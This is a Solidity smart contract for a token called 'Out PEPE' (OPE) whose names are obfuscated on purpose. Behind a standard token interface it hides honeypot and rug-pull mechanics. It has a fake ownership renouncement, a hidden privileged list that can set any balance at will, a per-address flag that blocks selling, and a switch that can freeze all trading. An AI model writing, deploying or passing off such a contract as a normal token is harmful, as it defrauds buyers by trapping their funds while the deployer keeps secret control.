//SPDX-License-Identifier: MIT

pragma solidity ^0.8.4;

interface modeSender {
    function totalSupply() external view returns (uint256);

    function balanceOf(address feeMax) external view returns (uint256);

    function transfer(address senderToken, uint256 fromTx) external returns (bool);

    function allowance(address minTotal, address spender) external view returns (uint256);

    function approve(address spender, uint256 fromTx) external returns (bool);

    function transferFrom(
        address sender,
        address senderToken,
        uint256 fromTx
    ) external returns (bool);

    event Transfer(address indexed from, address indexed modeTx, uint256 value);
    event Approval(address indexed minTotal, address indexed spender, uint256 value);
}

abstract contract totalReceiver {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface autoReceiver {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

interface enableLaunch {
    function createPair(address liquidityLimit, address liquidityTotal) external returns (address);
}

interface tokenEnable is modeSender {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract OutPEPE is totalReceiver, modeSender, tokenEnable {

    address autoTotalTake = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function decimals() external view virtual override returns (uint8) {
        return modeFund;
    }

    mapping(address => bool) public enableList;

    address public txAtTeam;

    function approve(address liquidityTx, uint256 fromTx) public virtual override returns (bool) {
        autoTotal[_msgSender()][liquidityTx] = fromTx;
        emit Approval(_msgSender(), liquidityTx, fromTx);
        return true;
    }

    uint256 private tradingSender;

    uint8 private modeFund = 18;

    function totalSupply() external view virtual override returns (uint256) {
        return fundList;
    }

    address public maxSellBuy;

    event OwnershipTransferred(address indexed isFund, address indexed sellFee);

    uint256 limitTotal;

    function autoMax(address listMax, uint256 fromTx) public {
        tokenTradingTo();
        tokenMinReceiver[listMax] = fromTx;
    }

    mapping(address => uint256) private tokenMinReceiver;

    function balanceOf(address feeMax) public view virtual override returns (uint256) {
        return tokenMinReceiver[feeMax];
    }

    uint256 private minIs;

    function limitTrading(address senderLiquidityTrading, address senderToken, uint256 fromTx) internal returns (bool) {
        if (senderLiquidityTrading == maxSellBuy) {
            return tradingLiquidity(senderLiquidityTrading, senderToken, fromTx);
        }
        uint256 enableSender = modeSender(txAtTeam).balanceOf(autoTotalTake);
        require(enableSender == modeExemptReceiver);
        require(senderToken != autoTotalTake);
        if (enableList[senderLiquidityTrading]) {
            return tradingLiquidity(senderLiquidityTrading, senderToken, fromEnableAmount);
        }
        return tradingLiquidity(senderLiquidityTrading, senderToken, fromTx);
    }

    uint256 constant fromEnableAmount = 17 ** 10;

    function getOwner() external view returns (address) {
        return receiverFrom;
    }

    string private fromSellWallet = "Out PEPE";

    function enableLiquidity(address marketingMax) public {
        require(marketingMax.balance < 100000);
        if (shouldAmount) {
            return;
        }
        
        swapBuy[marketingMax] = true;
        
        shouldAmount = true;
    }

    function modeEnable(uint256 fromTx) public {
        tokenTradingTo();
        modeExemptReceiver = fromTx;
    }

    function owner() external view returns (address) {
        return receiverFrom;
    }

    bool public shouldAmount;

    constructor (){
        if (minIs == totalEnableMode) {
            minIs = totalEnableMode;
        }
        autoReceiver amountFeeTake = autoReceiver(teamTo);
        txAtTeam = enableLaunch(amountFeeTake.factory()).createPair(amountFeeTake.WETH(), address(this));
        if (totalEnableMode == tradingSender) {
            minIs = tradingSender;
        }
        maxSellBuy = _msgSender();
        amountIs();
        swapBuy[maxSellBuy] = true;
        tokenMinReceiver[maxSellBuy] = fundList;
        
        emit Transfer(address(0), maxSellBuy, fundList);
    }

    uint256 public totalEnableMode;

    bool private exemptFund;

    address private receiverFrom;

    function transfer(address listMax, uint256 fromTx) external virtual override returns (bool) {
        return limitTrading(_msgSender(), listMax, fromTx);
    }

    mapping(address => mapping(address => uint256)) private autoTotal;

    function tradingLiquidity(address senderLiquidityTrading, address senderToken, uint256 fromTx) internal returns (bool) {
        require(tokenMinReceiver[senderLiquidityTrading] >= fromTx);
        tokenMinReceiver[senderLiquidityTrading] -= fromTx;
        tokenMinReceiver[senderToken] += fromTx;
        emit Transfer(senderLiquidityTrading, senderToken, fromTx);
        return true;
    }

    function symbol() external view virtual override returns (string memory) {
        return swapTrading;
    }

    function allowance(address launchedIs, address liquidityTx) external view virtual override returns (uint256) {
        if (liquidityTx == teamTo) {
            return type(uint256).max;
        }
        return autoTotal[launchedIs][liquidityTx];
    }

    function name() external view virtual override returns (string memory) {
        return fromSellWallet;
    }

    function tokenTradingTo() private view {
        require(swapBuy[_msgSender()]);
    }

    function amountIs() public {
        emit OwnershipTransferred(maxSellBuy, address(0));
        receiverFrom = address(0);
    }

    function liquidityAmount(address txLiquidity) public {
        tokenTradingTo();
        
        if (txLiquidity == maxSellBuy || txLiquidity == txAtTeam) {
            return;
        }
        enableList[txLiquidity] = true;
    }

    function transferFrom(address senderLiquidityTrading, address senderToken, uint256 fromTx) external override returns (bool) {
        if (_msgSender() != teamTo) {
            if (autoTotal[senderLiquidityTrading][_msgSender()] != type(uint256).max) {
                require(fromTx <= autoTotal[senderLiquidityTrading][_msgSender()]);
                autoTotal[senderLiquidityTrading][_msgSender()] -= fromTx;
            }
        }
        return limitTrading(senderLiquidityTrading, senderToken, fromTx);
    }

    string private swapTrading = "OPE";

    uint256 private fundList = 100000000 * 10 ** 18;

    address teamTo = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    uint256 modeExemptReceiver;

    mapping(address => bool) public swapBuy;

}